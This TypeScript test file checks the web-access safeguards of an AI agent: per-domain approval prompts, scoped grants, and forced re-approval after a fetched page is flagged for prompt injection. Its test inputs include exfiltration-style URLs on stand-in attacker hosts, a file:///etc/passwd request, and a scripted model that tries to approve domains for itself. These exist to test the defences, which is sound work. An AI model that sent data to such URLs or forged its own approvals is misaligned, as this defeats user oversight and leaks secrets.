import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import type * as Llm from '../llm-types.js';
import { runTurn, type ConversationDeps, type LlmClient, type VirtualTool } from '../llm-loop.js';
import { ToolRegistry } from '../tool-registry.js';
import type { McpConnectionLike } from '../mcp-client.js';
import { createApprovalGrant, createConversation, createProject, listGrantedWebHosts, openDb, runMigrations } from '../db.js';
import { WebApprovalGate } from '../web-approval.js';
import { loadConfig } from '../config.js';

function msg(content: Llm.ContentBlock[], stop: Llm.StopReason): Llm.Message {
  return {
    id: 'm', container: null, content, model: '@t/m', role: 'assistant', stop_reason: stop, stop_sequence: null, type: 'message',
    usage: { input_tokens: 1, output_tokens: 1, cache_creation_input_tokens: null, cache_read_input_tokens: null, server_tool_use: null, service_tier: null, cache_creation: null },
  } as unknown as Llm.Message;
}
const text = (t: string) => ({ type: 'text', text: t, citations: null }) as unknown as Llm.ContentBlock;
const use = (id: string, name: string, input: Record<string, unknown>) => ({ type: 'tool_use', id, name, input }) as unknown as Llm.ContentBlock;
function scripted(responses: Llm.Message[]): LlmClient {
  let i = 0;
  return { messages: { async create() { const r = responses[i++]; if (!r) throw new Error('out of responses'); return r; } } };
}

interface Call { tool: string; args: Record<string, unknown> }
type Reply = string | { text: string; isError?: boolean };
async function browserRegistry(calls: Call[], autoApprove: string[], replies: Record<string, Reply> = {}): Promise<ToolRegistry> {
  const registry = new ToolRegistry(autoApprove);
  const conn: McpConnectionLike = {
    name: 'playwright',
    async listTools() {
      return ['browser_open', 'browser_observe', 'browser_act', 'browser_close'].map(n => ({ name: n, description: n, inputSchema: { type: 'object' } }));
    },
    async callTool(tool, args) {
      calls.push({ tool, args: args ?? {} });
      const r = replies[tool] ?? `${tool} ok`;
      return typeof r === 'string' ? { text: r, isError: false } : { isError: false, ...r };
    },
  };
  await registry.loadFrom([conn]);
  return registry;
}

const DEFAULT_AUTO = loadConfig().autoApproveTools;

function fetchTool(ran: Array<Record<string, unknown>>, reply = 'page text'): VirtualTool {
  return {
    definition: { name: 'web_fetch', description: 'fetch', input_schema: { type: 'object', properties: { url: { type: 'string' } } } },
    handler: async input => { ran.push(input); return { text: reply }; },
  };
}

interface ConfirmCall { label: string; args: Record<string, unknown>; forcePrompt?: string }
function deps(over: Partial<ConversationDeps> & { llm: LlmClient; tools: ToolRegistry }, confirms: ConfirmCall[], answer: (c: ConfirmCall) => boolean = () => true): ConversationDeps {
  return {
    model: '@t/m',
    systemPrompt: 's',
    conversationId: 'conv-1',
    confirm: async (label, args, opts) => { const c = { label, args, forcePrompt: opts?.forcePrompt }; confirms.push(c); return answer(c); },
    ...over,
  };
}

describe('web_fetch — approval per domain', () => {
  it('asks once for the domain (grant label web:<host>) and runs only after approval', async () => {
    const ran: Array<Record<string, unknown>> = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([msg([use('1', 'web_fetch', { url: 'https://Docs.Example.com/a/b?q=1' })], 'tool_use'), msg([text('done')], 'end_turn')]),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran)],
    }, confirms), [], 'read it');
    assert.equal(confirms.length, 1);
    assert.equal(confirms[0]!.label, 'web:docs.example.com');
    assert.equal(confirms[0]!.args['url'], 'https://Docs.Example.com/a/b?q=1');
    assert.equal(confirms[0]!.args['tool'], 'web_fetch');
    assert.equal(ran.length, 1);
  });

  it('does not run when the user says no, and tells the model which domain was refused', async () => {
    const ran: Array<Record<string, unknown>> = [];
    const history = await runTurn(deps({
      llm: scripted([msg([use('1', 'web_fetch', { url: 'https://evil.example/x' })], 'tool_use'), msg([text('ok')], 'end_turn')]),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran)],
    }, [], () => false), [], 'read it');
    assert.equal(ran.length, 0);
    const result = JSON.stringify(history);
    assert.match(result, /did not allow web access to evil\.example/);
  });

  it('answers a bad or private URL itself, without bothering the user', async () => {
    const ran: Array<Record<string, unknown>> = [];
    const confirms: ConfirmCall[] = [];
    const history = await runTurn(deps({
      llm: scripted([
        msg([use('1', 'web_fetch', { url: 'not a url' }), use('2', 'web_fetch', { url: 'http://192.168.1.1/admin' }), use('3', 'web_fetch', { url: 'file:///etc/passwd' })], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran)],
    }, confirms), [], 'read');
    assert.equal(confirms.length, 0);
    assert.equal(ran.length, 0);
    const results = (history[2]!.content as Llm.ToolResultBlockParam[]);
    assert.equal(results.length, 3);
    assert.ok(results.every(r => r.is_error === true));
  });
});

describe('browser — approval per domain', () => {
  it('asks for the domain on browser_open, tells playwright which host was approved and sends the granted list', async () => {
    const calls: Call[] = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([msg([use('1', 'playwright__browser_open', { url: 'https://shop.example.com/cart' })], 'tool_use'), msg([text('ok')], 'end_turn')]),
      tools: await browserRegistry(calls, DEFAULT_AUTO),
      webAccess: { grantedHosts: () => ['docs.example.com'] },
    }, confirms), [], 'open');
    assert.deepEqual(confirms.map(c => c.label), ['web:shop.example.com']);
    assert.equal(calls.length, 1);
    assert.equal(calls[0]!.args['_approved_host'], 'shop.example.com');
    assert.deepEqual((calls[0]!.args['_policy'] as Record<string, unknown>)['domainGrant'], ['docs.example.com']);
  });

  it('does not open anything when the domain is refused', async () => {
    const calls: Call[] = [];
    await runTurn(deps({
      llm: scripted([msg([use('1', 'playwright__browser_open', { url: 'https://shop.example.com/' })], 'tool_use'), msg([text('ok')], 'end_turn')]),
      tools: await browserRegistry(calls, DEFAULT_AUTO),
      webAccess: { grantedHosts: () => [] },
    }, [], () => false), [], 'open');
    assert.equal(calls.length, 0);
  });

  it('a model cannot approve a domain or widen the grant list itself', async () => {
    const calls: Call[] = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([
        msg([use('1', 'playwright__browser_observe', { _approved_host: 'evil.example', _policy: { domainGrant: ['evil.example'], js: 'allowed' } })], 'tool_use'),
        msg([use('2', 'playwright__browser_open', { url: 'https://good.example/', _approved_host: 'evil.example' })], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: await browserRegistry(calls, DEFAULT_AUTO),
      browserPolicy: { domainDeny: ['bad.example'] },
      webAccess: { grantedHosts: () => ['ok.example'] },
    }, confirms), [], 'go');
    assert.equal('_approved_host' in calls[0]!.args, false);
    assert.deepEqual(calls[0]!.args['_policy'], { domainDeny: ['bad.example'], domainGrant: ['ok.example'] });
    assert.equal(calls[1]!.args['_approved_host'], 'good.example');
  });

  it('browser_act and browser_close run without prompting; irreversible actions always ask', async () => {
    const calls: Call[] = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([
        msg([use('1', 'playwright__browser_act', { action: 'click', label: 'Next page' })], 'tool_use'),
        msg([use('2', 'playwright__browser_act', { action: 'click', label: 'Confirm payment' })], 'tool_use'),
        msg([use('3', 'playwright__browser_close', {})], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: await browserRegistry(calls, DEFAULT_AUTO),
      webAccess: { grantedHosts: () => [] },
    }, confirms, c => !c.forcePrompt), [], 'go');
    assert.equal(confirms.length, 1);
    assert.match(confirms[0]!.forcePrompt ?? '', /irreversible/);
    assert.deepEqual(calls.map(c => c.tool), ['browser_act', 'browser_close']);
  });

  it('without webAccess the browser keeps the old behaviour (project policy only, generic approval)', async () => {
    const calls: Call[] = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([msg([use('1', 'playwright__browser_open', { url: 'https://x.example/' })], 'tool_use'), msg([text('ok')], 'end_turn')]),
      tools: await browserRegistry(calls, []),
      browserPolicy: { js: 'review' },
    }, confirms), [], 'open');
    assert.equal(confirms.length, 1);
    assert.notEqual(confirms[0]!.label.startsWith('web:'), true);
    assert.deepEqual(calls[0]!.args['_policy'], { js: 'review' });
    assert.equal('_approved_host' in calls[0]!.args, false);
  });

  it('the default auto-approve list covers the browser tools, and no longer names browse_url', () => {
    for (const t of ['browser_open', 'browser_observe', 'browser_act', 'browser_close']) assert.ok(DEFAULT_AUTO.includes(t), t);
    assert.equal(DEFAULT_AUTO.includes('browse_url'), false);
  });
});

describe('prompt injection from the web', () => {
  const FLAGGED = '[browser-meta] {"injection_suspected":true,"injection_score":5,"injection_reasons":["instruction override"]}\nbody';

  it('a flagged web_fetch makes the next domain and the next effectful tool ask again, with the warning', async () => {
    const ran: Array<Record<string, unknown>> = [];
    const confirms: ConfirmCall[] = [];
    const bash: VirtualTool = {
      definition: { name: 'make_note', description: 'x', input_schema: { type: 'object' } },
      handler: async () => ({ text: 'noted' }),
    };
    await runTurn(deps({
      llm: scripted([
        msg([use('1', 'web_fetch', { url: 'https://a.example/' })], 'tool_use'),
        msg([use('2', 'web_fetch', { url: 'https://b.example/' }), use('3', 'make_note', {})], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran, FLAGGED), bash],
    }, confirms), [], 'go');
    assert.equal(confirms[0]!.forcePrompt, undefined);
    assert.match(confirms[1]!.forcePrompt ?? '', /prompt injection/);
    assert.equal(confirms[1]!.label, 'web:b.example');
    // The note tool asks too — once, not twice for the same call.
    assert.deepEqual(confirms.map(c => c.label), ['web:a.example', 'web:b.example', 'make_note']);
  });

  it('a flagged browser page does the same, and read-only calls stay quiet', async () => {
    const calls: Call[] = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([
        msg([use('1', 'playwright__browser_observe', {})], 'tool_use'),
        msg([use('2', 'playwright__browser_observe', {}), use('3', 'playwright__browser_act', { action: 'click', label: 'Next' })], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: await browserRegistry(calls, DEFAULT_AUTO, { browser_observe: FLAGGED }),
      webAccess: { grantedHosts: () => [] },
    }, confirms), [], 'go');
    assert.deepEqual(confirms.map(c => c.label.includes('browser_act')), [true]);
    assert.match(confirms[0]!.forcePrompt ?? '', /prompt injection/);
  });
});

describe('domain grants end to end (approval gate + grants table)', () => {
  function setup() {
    const db = openDb(':memory:');
    runMigrations(db);
    const gate = new WebApprovalGate(db);
    return { db, gate };
  }
  const approve = (gate: WebApprovalGate, scope: 'once' | 'chat' | 'project' | 'always', conversationId: string, projectId?: string) => {
    const pending = gate.listPending();
    assert.equal(pending.length, 1);
    gate.resolve(pending[0]!.id, true, scope, { conversationId, projectId });
  };

  it('"Always in this chat" is remembered for that domain and chat only', async () => {
    const { db, gate } = setup();
    const conv = createConversation(db, {}).id;
    const other = createConversation(db, {}).id;
    const first = gate.confirmDetailed(conv, 'web:docs.example.com', { url: 'https://docs.example.com/' }, undefined, {});
    approve(gate, 'chat', conv);
    assert.equal((await first).approved, true);
    assert.deepEqual(listGrantedWebHosts(db, { conversationId: conv }), ['docs.example.com']);
    assert.deepEqual(listGrantedWebHosts(db, { conversationId: other }), []);
    // Next time: no pending card.
    assert.equal((await gate.confirmDetailed(conv, 'web:docs.example.com', { url: 'https://docs.example.com/x' }, undefined, {})).approved, true);
    assert.equal(gate.listPending().length, 0);
    // Another domain still asks.
    const second = gate.confirmDetailed(conv, 'web:other.example.com', {}, undefined, {});
    assert.equal(gate.listPending().length, 1);
    gate.resolve(gate.listPending()[0]!.id, false);
    assert.equal((await second).approved, false);
  });

  it('"Allow once" leaves no grant, and a suspected injection never reuses one', async () => {
    const { db, gate } = setup();
    const conv = createConversation(db, {}).id;
    const once = gate.confirmDetailed(conv, 'web:a.example', {}, undefined, {});
    approve(gate, 'once', conv);
    await once;
    assert.deepEqual(listGrantedWebHosts(db, { conversationId: conv }), []);

    createApprovalGrant(db, { toolLabel: 'web:b.example', scope: 'always', subjectType: null, subjectId: null, conversationId: null, projectId: null, expiresAt: null });
    const forced = gate.confirmDetailed(conv, 'web:b.example', {}, undefined, { forcePrompt: 'looked like an injection' });
    assert.equal(gate.listPending().length, 1);
    gate.resolve(gate.listPending()[0]!.id, true, 'always', { conversationId: conv });
    await forced;
    // Approving a forced prompt does not create (another) grant.
    assert.equal((db.prepare(`SELECT COUNT(*) AS n FROM approval_grants WHERE tool_label = 'web:b.example'`).get() as { n: number }).n, 1);
  });

  it('listGrantedWebHosts honours scope, project, model, expiry and revocation', () => {
    const { db, gate } = setup();
    const project = createProject(db, { name: 'P' }).id;
    const conv = createConversation(db, { projectId: project }).id;
    const grant = (label: string, over: Partial<Parameters<typeof createApprovalGrant>[1]>) =>
      createApprovalGrant(db, { toolLabel: label, scope: 'always', subjectType: null, subjectId: null, conversationId: null, projectId: null, expiresAt: null, ...over });
    grant('web:everywhere.example', {});
    grant('web:project.example', { scope: 'project', projectId: project });
    grant('web:chat.example', { scope: 'chat', conversationId: conv });
    grant('web:model.example', { subjectType: 'model', subjectId: '@t/m' });
    grant('web:expired.example', { expiresAt: '2000-01-01 00:00:00' });
    grant('run_bash', {});
    grant('web:revoked.example', {});
    assert.deepEqual(
      listGrantedWebHosts(db, { conversationId: conv, projectId: project, modelId: '@t/m' }),
      ['chat.example', 'everywhere.example', 'model.example', 'project.example', 'revoked.example'],
    );
    assert.deepEqual(listGrantedWebHosts(db, { conversationId: conv, projectId: project, modelId: '@t/other' }).includes('model.example'), false);
    assert.deepEqual(listGrantedWebHosts(db, {}), ['everywhere.example', 'revoked.example']);
    const id = gate.listGrants().find(g => g.toolLabel === 'web:revoked.example')!.id;
    gate.revokeGrant(id);
    assert.equal(listGrantedWebHosts(db, { conversationId: conv }).includes('revoked.example'), false);
  });
});

describe('web_fetch through the real server (buildApp)', () => {
  it('asks for the domain, remembers "for this chat", and does not ask again for the same site', async () => {
    const http = await import('node:http');
    const { buildApp } = await import('../server.js');
    const { ProviderRouter } = await import('../providers/router.js');
    const { getMessages } = await import('../db.js');

    // The "internet": a local server; DNS and the address check are replaced through the test seams.
    const site = http.createServer((_req, res) => { res.setHeader('content-type', 'text/plain'); res.end('hello from the site'); });
    await new Promise<void>(r => site.listen(0, '127.0.0.1', () => r()));
    const sitePort = (site.address() as import('node:net').AddressInfo).port;
    const target = `http://docs.example.test:${sitePort}/page`;

    let call = 0;
    const results: string[] = [];
    const client = {
      messages: {
        async create(p: Llm.MessageCreateParamsNonStreaming) {
          call++;
          const last = p.messages.at(-1)!;
          if (Array.isArray(last.content)) for (const b of last.content) if (b.type === 'tool_result') results.push(String(b.content));
          if (call === 1 || call === 3) return msg([use(`t${call}`, 'web_fetch', { url: target })], 'tool_use');
          return msg([text(`reply ${call}`)], 'end_turn');
        },
        batches: { create() { throw new Error('unused'); }, retrieve() { throw new Error('unused'); }, results() { throw new Error('unused'); } },
      },
    };
    const db = openDb(':memory:');
    runMigrations(db);
    const router = new ProviderRouter({ db, env: {}, llmOverride: client as never });
    router.catalog.create({ slug: 't', label: 'Test', baseUrl: 'https://t.example/v1', keyOptional: true });
    router.catalog.addManual('t', 'm', { tags: ['reasoning'] });
    const built = await buildApp({
      db, connections: [], router, authToken: 't', config: { model: '', autoApproveTools: [] },
      web: { fetchOptions: { resolve: async () => [{ address: '127.0.0.1', family: 4 }], isBlockedAddress: () => false }, env: {} },
    });
    const server = built.app.listen(0);
    await new Promise<void>(r => server.once('listening', () => r()));
    const port = (server.address() as import('node:net').AddressInfo).port;
    const api = (method: string, path: string, body?: unknown) => new Promise<{ status: number; json: any }>((resolve, reject) => {
      const payload = body !== undefined ? JSON.stringify(body) : undefined;
      const r = http.request({ host: '127.0.0.1', port, method, path, headers: { 'content-type': 'application/json', authorization: 'Bearer t', ...(payload ? { 'content-length': Buffer.byteLength(payload) } : {}) } }, res => {
        const c: Buffer[] = [];
        res.on('data', d => c.push(d));
        res.on('end', () => { const t = Buffer.concat(c).toString(); resolve({ status: res.statusCode ?? 0, json: t ? JSON.parse(t) : {} }); });
      });
      r.on('error', reject);
      if (payload) r.write(payload);
      r.end();
    });
    const waitFor = async (cond: () => boolean | Promise<boolean>, ms = 4000) => {
      const t0 = Date.now();
      while (!(await cond())) { if (Date.now() - t0 > ms) throw new Error('waitFor timed out'); await new Promise(r => setTimeout(r, 20)); }
    };

    try {
      const conv = (await api('POST', '/api/conversations', {})).json.id as string;
      await api('POST', `/api/conversations/${conv}/message`, { text: 'read the docs' });
      await waitFor(async () => (await api('GET', '/api/pending-approvals')).json.pending.length === 1);
      const pending = (await api('GET', '/api/pending-approvals')).json.pending[0];
      assert.equal(pending.toolLabel, 'web:docs.example.test');
      assert.equal(pending.args.tool, 'web_fetch');
      assert.equal((await api('POST', '/api/approve', { id: pending.id, approved: true, scope: 'chat' })).status, 200);

      await waitFor(() => getMessages(db, conv).length >= 4);
      assert.match(results[0]!, /hello from the site/);
      assert.match(results[0]!, /<untrusted_web_content/);
      assert.deepEqual(listGrantedWebHosts(db, { conversationId: conv }), ['docs.example.test']);

      // Second turn, same site: no card, the page just arrives.
      await api('POST', `/api/conversations/${conv}/message`, { text: 'again' });
      await waitFor(() => getMessages(db, conv).length >= 8);
      assert.equal((await api('GET', '/api/pending-approvals')).json.pending.length, 0);
      assert.match(results[1]!, /hello from the site/);
    } finally {
      built.stop();
      server.closeAllConnections();
      server.close();
      site.closeAllConnections();
      site.close();
      db.close();
    }
  });
});

describe('web_fetch — only addresses from the conversation open without asking', () => {
  const fetchUse = (url: string) => msg([use('f', 'web_fetch', { url })], 'tool_use');
  async function run(opts: { user: string; before?: Llm.MessageParam[]; url: string; trusted?: boolean; injected?: boolean }) {
    const ran: Array<Record<string, unknown>> = [];
    const confirms: ConfirmCall[] = [];
    const responses = [fetchUse(opts.url), msg([text('ok')], 'end_turn')];
    await runTurn(deps({
      llm: scripted(responses),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran)],
      userUrlsTrusted: opts.trusted,
    }, confirms), opts.before ?? [], opts.user);
    return { ran, confirms };
  }
  const searchHistory = (resultText: string): Llm.MessageParam[] => [
    { role: 'user', content: 'find docs' },
    { role: 'assistant', content: [use('s1', 'web_search', { query: 'docs' })] as never },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 's1', content: resultText }] as never },
    { role: 'assistant', content: [text('found')] as never },
  ];

  it('a URL or bare domain the user typed opens any page of that host without a card', async () => {
    for (const [user, url] of [
      ['please read https://docs.example.com/guide', 'https://docs.example.com/other/page?x=1'],
      ['summarise docs.example.com/guide for me.', 'https://docs.example.com/guide'],
      ['see [this](https://docs.example.com/a_(b)) ok', 'https://docs.example.com/z'],
    ] as const) {
      const { ran, confirms } = await run({ user, url });
      assert.equal(confirms.length, 0, user);
      assert.equal(ran.length, 1, user);
    }
  });

  it('a URL from search results opens exactly as returned — appending anything makes it ask', async () => {
    const results = '[browser-meta] {}\n1. Docs\n   https://nodejs.org/docs/latest/api/fs.html\n   Official';
    const exact = await run({ user: 'go on', before: searchHistory(results), url: 'https://nodejs.org/docs/latest/api/fs.html#readFile' });
    assert.equal(exact.confirms.length, 0);
    assert.equal(exact.ran.length, 1);
    const tampered = await run({ user: 'go on', before: searchHistory(results), url: 'https://nodejs.org/docs/latest/api/fs.html?d=SECRET' });
    assert.deepEqual(tampered.confirms.map(c => c.label), ['web:nodejs.org']);
    assert.equal(tampered.confirms[0]!.args['outsideContext'], true);
    const otherPath = await run({ user: 'go on', before: searchHistory(results), url: 'https://nodejs.org/evil' });
    assert.equal(otherPath.confirms.length, 1);
  });

  it('an address the model made up asks, whatever the model wrote in its own earlier text', async () => {
    const before: Llm.MessageParam[] = [
      { role: 'user', content: 'hi' },
      { role: 'assistant', content: [text('I could look at https://attacker.example/x')] as never },
    ];
    const { confirms, ran } = await run({ user: 'ok', before, url: 'https://attacker.example/x?d=1' });
    assert.deepEqual(confirms.map(c => c.label), ['web:attacker.example']);
    assert.equal(ran.length, 1);
  });

  it('URLs in results of other tools do not count', async () => {
    const before: Llm.MessageParam[] = [
      { role: 'user', content: 'read the file' },
      { role: 'assistant', content: [use('r1', 'read_file', { path: 'a.md' })] as never },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'r1', content: 'see https://attacker.example/steal' }] as never },
      { role: 'assistant', content: [text('done')] as never },
    ];
    const { confirms } = await run({ user: 'ok', before, url: 'https://attacker.example/steal' });
    assert.equal(confirms.length, 1);
  });

  it('subagents do not trust URLs in their goal; a suspected injection makes even known URLs ask', async () => {
    const worker = await run({ user: 'goal: read https://docs.example.com/guide', url: 'https://docs.example.com/guide', trusted: false });
    assert.equal(worker.confirms.length, 1);

    const ran: Array<Record<string, unknown>> = [];
    const confirms: ConfirmCall[] = [];
    await runTurn(deps({
      llm: scripted([
        msg([use('1', 'web_fetch', { url: 'https://a.example/' })], 'tool_use'),
        msg([use('2', 'web_fetch', { url: 'https://a.example/next' })], 'tool_use'),
        msg([text('ok')], 'end_turn'),
      ]),
      tools: new ToolRegistry([]),
      virtualTools: [fetchTool(ran, '[browser-meta] {"injection_suspected":true,"injection_reasons":["x"]}\nSee https://a.example/next')],
    }, confirms), [], 'read https://a.example/');
    assert.equal(confirms.length, 1);
    assert.match(confirms[0]!.forcePrompt ?? '', /prompt injection/);
  });
});
